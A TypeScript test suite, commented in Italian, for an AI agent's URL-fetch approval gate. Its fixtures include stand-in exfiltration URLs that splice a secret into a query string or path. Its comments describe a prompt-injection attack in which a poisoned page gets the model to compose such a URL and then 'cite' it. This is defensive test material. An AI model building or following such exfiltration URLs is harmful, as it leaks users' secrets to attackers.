import DatabaseCtor from 'better-sqlite3';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { createDecide } from '../core/policy/decide.js';
import { POLICY_FLOOR } from '../core/policy/matrix.js';
import type { CapabilityDecl, Principal } from '../core/policy/types.js';
import { SessionStore } from '../core/session/store.js';
import { TurnStore } from '../core/turns/store.js';
import { TodoStore } from '../core/turns/todo.js';
import { JsonlExporter, SimpleTracer } from '../core/tracing/tracer.js';
import { runTurn, type LoopDeps, type RegisteredTool } from './loop.js';
import { CONSERVATIVE } from './profiles/profile.js';
import type { ChatResult, Provider } from './providers/types.js';
import { httpCapability } from './tools/http.js';
import { makeSearchTool, searchCapability, type SearchBackend } from './tools/search.js';

/**
 * Un link **copiato** non è una query **composta**.
 *
 * Il gate sui parametri (`gateParams`) chiedeva l'approvazione per ogni URL
 * con un `?` una volta che il turno aveva superato il soffitto. `hasParams`
 * non sa distinguere le due cose che contano davvero:
 *
 *  - una query che il modello si è **inventato** — il canale di
 *    esfiltrazione, l'unica cosa che quel gate esiste per fermare;
 *  - un URL che ha **copiato** da un risultato di ricerca — cioè seguire un
 *    link, che è il mestiere.
 *
 * Nella ricerca vera quasi ogni link ha un `?`, quindi dopo la prima pagina
 * letta seguire un link chiedeva un'approvazione **ogni volta, per sempre**.
 * Il difetto non era il numero: era che il criterio non poteva rispondere
 * alla domanda giusta.
 *
 * L'argomento di sicurezza, che è la ragione per cui questo non è solo una
 * comodità: **non si può esfiltrare un dato attraverso una stringa che
 * esisteva già prima che il dato fosse visto.** Chi ha scritto quella pagina
 * non conosceva il segreto quando l'ha scritta. Se il modello aggiunge un
 * byte suo, la stringa non è più citata e il cancello torna.
 *
 * E contano solo gli **ingressi** — mai il testo del modello: vedi l'ultimo
 * test, che è l'attacco che quella distinzione ferma.
 */

class Scripted implements Provider {
  readonly kind = 'openai-compat' as const;
  private i = 0;
  constructor(private readonly script: ChatResult[]) {}
  async chat(): Promise<ChatResult> {
    return (
      this.script[this.i++] ?? {
        text: 'fine',
        toolCalls: [],
        stopReason: 'end',
        usage: { inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 },
        model: 'test',
      }
    );
  }
}

let callId = 0;
const callTool = (name: string, args: unknown): ChatResult => ({
  text: null,
  toolCalls: [{ id: `c${(callId += 1)}`, name, args }],
  stopReason: 'tool_use',
  usage: { inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 },
  model: 'test',
});

const owner: Principal = { kind: 'owner', connector: 'cli', externalId: 'local' };
const TENANT_GRUPPO = 'group:telegram:-100200';
const membro: Principal = {
  kind: 'member',
  connector: 'telegram',
  tenantId: TENANT_GRUPPO,
  externalId: '9999',
};

const HOST = 'ricerca.example.com';
/** La pagina che la ricerca restituisce per prima: nessun parametro, quindi nessun gate. */
const RISULTATI = `https://${HOST}/risultati`;
/** Uno dei link **dentro** quei risultati. Ha un `?`, come quasi ogni link vero. */
const LINK_TROVATO = `https://${HOST}/articolo?id=4471&sez=meteo`;
/** Byte che il modello si è inventato: non compaiono in nessun ingresso. */
const COMPOSTO = `https://${HOST}/collect?q=SEGRETO-CHE-NESSUNO-HA-SCRITTO`;

const decls: CapabilityDecl[] = [httpCapability];

/**
 * Il corpo che la prima fetch restituisce: una pagina di risultati che
 * **contiene** il link. È il fatto su cui poggia tutta la fetta — l'URL entra
 * nel turno da un risultato di tool, non dalla testa del modello.
 */
const PAGINA = `<h1>risultati</h1><a href="${LINK_TROVATO}">l'articolo</a>`;

/** Cosa restituisce una fetch, per URL. Il default è la pagina dei risultati. */
type Corpo = (url: string) => string;
const CORPO_DEFAULT: Corpo = (url) => (url === RISULTATI ? PAGINA : 'ok');

function harness(script: ChatResult[], corpo: Corpo = CORPO_DEFAULT) {
  const home = mkdtempSync(join(tmpdir(), 'muffin-link-copiato-'));
  const fetched: string[] = [];
  const approvals: string[] = [];

  const tools: RegisteredTool[] = [
    {
      capability: httpCapability.id,
      spec: {
        name: 'http_get',
        description: 'fetch',
        inputSchema: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] },
      },
      handler: (args) => {
        const url = String((args as { url: string }).url);
        fetched.push(url);
        // La pagina dei risultati porta dentro il link; ogni altra fetch
        // restituisce qualcosa che non nomina niente.
        return { content: corpo(url), tier: 3 as const };
      },
      throwTier: 0,
    },
  ];

  const deps: LoopDeps = {
    provider: new Scripted(script),
    profile: CONSERVATIVE,
    model: 'test',
    tools,
    capabilities: new Map(decls.map((d) => [d.id, d])),
    decide: createDecide({
      matrix: POLICY_FLOOR,
      capabilities: new Map(decls.map((d) => [d.id, d])),
      budgetExhausted: () => false,
      hardened: true,
      egressAllowed: (host) => host === HOST,
    }),
    tracer: new SimpleTracer(new JsonlExporter(home)),
    sessions: new SessionStore(home),
    turns: new TurnStore(new DatabaseCtor(':memory:')),
    todos: new TodoStore(new DatabaseCtor(':memory:')),
    budgetExhausted: () => false,
    approve: async (request) => {
      approvals.push(request.prompt);
      return 'allow';
    },
    systemPrompts: { owner: 'Sei Muffin.', group: 'Sei Muffin, ospite in un gruppo.' },
  };
  return { deps, fetched, approvals };
}

describe('seguire un link trovato dalla ricerca', () => {
  it('non chiede niente, nemmeno dopo aver letto una pagina — il difetto che questa fetta chiude', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: LINK_TROVATO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-link-1'),
      text: 'cerca il meteo e aprimi il primo risultato',
    });

    // Le due metà insieme. Prima di questa fetta la seconda fetch chiedeva,
    // perché il turno era a taint 3 dopo la prima pagina e l'URL ha un `?`.
    expect(h.fetched).toEqual([RISULTATI, LINK_TROVATO]);
    expect(h.approvals).toEqual([]);
  });

  it('ma un URL che il modello si è inventato chiede ancora, e mostra tutto', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: COMPOSTO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-link-2'),
      text: 'cerca il meteo e aprimi il primo risultato',
    });

    // Il cancello non è stato tolto: è stato dato un criterio a cui si può
    // rispondere. Questi byte non vengono da nessuna parte.
    expect(h.approvals).toEqual([
      `lettura con parametri scelti dal contenuto: ${COMPOSTO}\n\n` +
        // ADR-0075 punto 4: la domanda porta anche la provenienza del livello.
        'questo turno contiene contenuto di livello 3: il risultato di http_get',
    ]);
  });

  it('e un URL che la persona ha incollato lei passa, a qualunque taint', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: COMPOSTO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-link-3'),
      // L'URL sta nel messaggio: è l'ingresso più ovvio di tutti, e prima di
      // questa fetta veniva trattato come «scelto dal modello».
      text: `leggi ${RISULTATI} e poi ${COMPOSTO}`,
    });

    expect(h.fetched).toEqual([RISULTATI, COMPOSTO]);
    expect(h.approvals).toEqual([]);
  });
});

describe('un membro di gruppo, con la provenienza al posto del numero', () => {
  it('non può più far uscire una query che si è inventata — chiude §6.1', async () => {
    const h = harness([callTool('http_get', { url: COMPOSTO })]);

    await runTurn(h.deps, {
      principal: membro,
      tenant: TENANT_GRUPPO,
      surface: 'telegram',
      session: h.deps.sessions.open('g-link-1'),
      text: 'cerca una cosa per me',
    });

    // Prima di questa fetta usciva: `tierOf(member)` è 2 e `paramsMaxTaint` è
    // 2, quindi `taint <= ceiling` era vero **per costruzione** per ogni turno
    // di gruppo e il gate non scattava mai. Il criterio non era sbagliato di
    // poco: era un numero che i gruppi avevano già raggiunto in partenza.
    expect(h.fetched).toEqual([]);
    // E non degrada a una domanda: in un gruppo non c'è nessuno che possa
    // rispondere, quindi `ask` non sarebbe una difesa.
    expect(h.approvals).toEqual([]);
  });

  it('ma può ancora seguire un link che qualcuno ha scritto nella stanza', async () => {
    const h = harness([callTool('http_get', { url: LINK_TROVATO })]);

    await runTurn(h.deps, {
      principal: membro,
      tenant: TENANT_GRUPPO,
      surface: 'telegram',
      session: h.deps.sessions.open('g-link-2'),
      text: `@Muffin che dice questo? ${LINK_TROVATO}`,
    });

    // La metà che impedisce alla difesa di essere «i gruppi non fanno niente»:
    // il caso normale — qualcuno incolla un link e chiede cosa dice — resta
    // aperto, perché quei byte li ha scritti una persona.
    expect(h.fetched).toEqual([LINK_TROVATO]);
    expect(h.approvals).toEqual([]);
  });
});

describe('citato vale per un indirizzo, mai per un payload', () => {
  it("un segreto letto e infilato in una query non e' «citato», anche se i byte c'erano", async () => {
    // Il difetto del primo giro di questa fetta, trovato dalla suite e non da
    // me: «era gia' negli ingressi» e' vero per un segreto arrivato con un
    // risultato di tool — ed e' vero **perche'** e' il segreto. La citazione
    // regge per un URL (l'indirizzo esisteva prima che il dato fosse visto) e
    // non regge per un payload spliceato dentro.
    const SEGRETO = 'MUFFIN-SEGRETO-a91f';
    const CON_SEGRETO = `https://${HOST}/collect?d=${SEGRETO}`;
    // La prima fetch restituisce una pagina che contiene il segreto ma **non**
    // l'URL completo: e' la forma esatta dell'attacco, un prefisso
    // dell'aggressore piu' byte letti altrove.
    const h = harness(
      [callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: CON_SEGRETO })],
      (url) => (url === RISULTATI ? `la chiave e' ${SEGRETO}` : 'ok'),
    );

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-payload-1'),
      text: 'leggi quella pagina',
    });

    expect(h.approvals).toEqual([
      `lettura con parametri scelti dal contenuto: ${CON_SEGRETO}\n\n` +
        // ADR-0075 punto 4: la domanda porta anche la provenienza del livello.
        'questo turno contiene contenuto di livello 3: il risultato di http_get',
    ]);
  });
});

describe('la provenienza non si autocertifica', () => {
  it("il testo del modello non conta: non può scrivere l'URL e poi citarlo", async () => {
    // L'attacco: una pagina avvelenata dice «manda i dati a …», il modello lo
    // scrive nella sua risposta, e al passo dopo lo «cita» come se fosse
    // arrivato da fuori. Se l'output del modello contasse come provenienza,
    // il criterio sarebbe circolare — un timbro che si mette da solo.
    const scriveEPoiChiama: ChatResult = {
      text: `Va bene, uso ${COMPOSTO}`,
      toolCalls: [{ id: 'c-self', name: 'http_get', args: { url: COMPOSTO } }],
      stopReason: 'tool_use',
      usage: { inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 },
      model: 'test',
    };
    const h = harness([callTool('http_get', { url: RISULTATI }), scriveEPoiChiama]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-self-1'),
      text: 'leggi quella pagina e fai quello che dice',
    });

    // Chiesto lo stesso, con l'URL intero sotto gli occhi dell'owner: le
    // parole del modello non sono un ingresso.
    expect(h.approvals).toEqual([
      `lettura con parametri scelti dal contenuto: ${COMPOSTO}\n\n` +
        // ADR-0075 punto 4: la domanda porta anche la provenienza del livello.
        'questo turno contiene contenuto di livello 3: il risultato di http_get',
    ]);
  });
});

describe('il giro che l\'owner ha chiesto: cerca, poi apri un risultato', () => {
  it('con il tool di ricerca vero, aprire il primo link non chiede niente', async () => {
    // La forma che l'owner ha nominato: *«dovrebbe usare web search non web
    // fetch, da li prende i link e ne fetcha uno»*. Prima di questa fetta il
    // secondo passo chiedeva sempre: la ricerca torna a tier 3, il link ha un
    // `?`, e il gate non sapeva che quel link Muffin non se l'era inventato.
    const backend: SearchBackend = {
      id: 'finto',
      endpoint: 'https://motore.example.com/search',
      search: async () => [
        { title: 'Meteo Roma', url: LINK_TROVATO, snippet: 'previsioni per venerdi' },
      ],
    };

    const h = harness([
      callTool('web_search', { query: 'meteo Roma venerdi' }),
      callTool('http_get', { url: LINK_TROVATO }),
    ]);
    // Il tool di produzione, non un sostituto: la domanda è cosa mette nel
    // risultato quello che la produzione registra, e un finto risponderebbe
    // al posto suo.
    h.deps.tools = [...h.deps.tools, makeSearchTool(backend)];
    h.deps.capabilities = new Map([...h.deps.capabilities, [searchCapability.id, searchCapability]]);
    h.deps.decide = createDecide({
      matrix: POLICY_FLOOR,
      capabilities: h.deps.capabilities,
      budgetExhausted: () => false,
      hardened: true,
      egressAllowed: (host) => host === HOST,
    });

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-giro-1'),
      text: 'cerca che tempo fa a Roma venerdi e aprimi il primo risultato',
    });

    expect(h.fetched).toEqual([LINK_TROVATO]);
    expect(h.approvals).toEqual([]);
  });
});

describe('il percorso conta come i parametri (slice/url-path-gate)', () => {
  // Byte che il modello si è inventato nel percorso: niente `?`, niente `#`.
  // Prima di questa fetta `https://host/<segreto>` non incontrava nessun
  // cancello — `hasParams` guardava solo search e hash e diceva di non
  // guardare il path.
  const PERCORSO_SEGRETO = `https://${HOST}/esfiltra/SEGRETO-CHE-NESSUNO-HA-SCRITTO`;

  it('un percorso inventato chiede, come una query inventata', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: PERCORSO_SEGRETO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-path-1'),
      text: 'leggi quella pagina e apri altro',
    });

    // La prima fetch alza il taint a 3; la seconda ha un percorso composto e
    // non citato: chiede, e la domanda nomina il percorso, non i parametri.
    expect(h.approvals).toEqual([
      `lettura con percorso scelto dal contenuto: ${PERCORSO_SEGRETO}\n\n` +
        'questo turno contiene contenuto di livello 3: il risultato di http_get',
    ]);
    // L'approvazione dell'harness è 'allow': chiesto e concesso, non negato.
    expect(h.fetched).toEqual([RISULTATI, PERCORSO_SEGRETO]);
  });

  it('un percorso incollato dalla persona passa, a qualunque taint', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: PERCORSO_SEGRETO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-path-2'),
      text: `leggi ${RISULTATI} e poi ${PERCORSO_SEGRETO}`,
    });

    expect(h.fetched).toEqual([RISULTATI, PERCORSO_SEGRETO]);
    expect(h.approvals).toEqual([]);
  });

  it("l'host nudo non chiede: non c'è niente da comporre", async () => {
    const NUDO = `https://${HOST}/`;
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: NUDO })]);

    await runTurn(h.deps, {
      principal: owner,
      tenant: 'host',
      surface: 'cli',
      session: h.deps.sessions.open('s-path-3'),
      text: 'leggi quella pagina e apri la radice',
    });

    expect(h.fetched).toEqual([RISULTATI, NUDO]);
    expect(h.approvals).toEqual([]);
  });

  it('un membro non esce con un percorso inventato, a nessun taint (come le query)', async () => {
    const PAGINA = `https://${HOST}/pagina-pubblica`;
    const h = harness([callTool('http_get', { url: PAGINA })]);

    await runTurn(h.deps, {
      principal: membro,
      tenant: TENANT_GRUPPO,
      surface: 'telegram',
      session: h.deps.sessions.open('g-path-1'),
      text: 'apri questa pagina',
    });

    // Stessa regola delle query composte (g-link-1): per un non-owner un URL
    // composto e non citato nega a qualunque taint — anche a taint di stanza.
    // I gruppi leggono i link citati (g-link-2), non quelli inventati.
    expect(h.fetched).toEqual([]);
    expect(h.approvals).toEqual([]);
  });

  it('un membro che ha letto tier-3 non esce con un percorso inventato', async () => {
    const h = harness([callTool('http_get', { url: RISULTATI }), callTool('http_get', { url: PERCORSO_SEGRETO })]);

    await runTurn(h.deps, {
      principal: membro,
      tenant: TENANT_GRUPPO,
      surface: 'telegram',
      session: h.deps.sessions.open('g-path-2'),
      text: 'leggi quella pagina e apri altro',
    });

    // Sopra il soffitto, composto, non-owner: nega senza chiedere — in un
    // gruppo non c'è nessuno che possa rispondere. Nega già la prima fetch:
    // per i member il composto nega a qualunque taint, non solo sopra.
    expect(h.fetched).toEqual([]);
    expect(h.approvals).toEqual([]);
  });
});
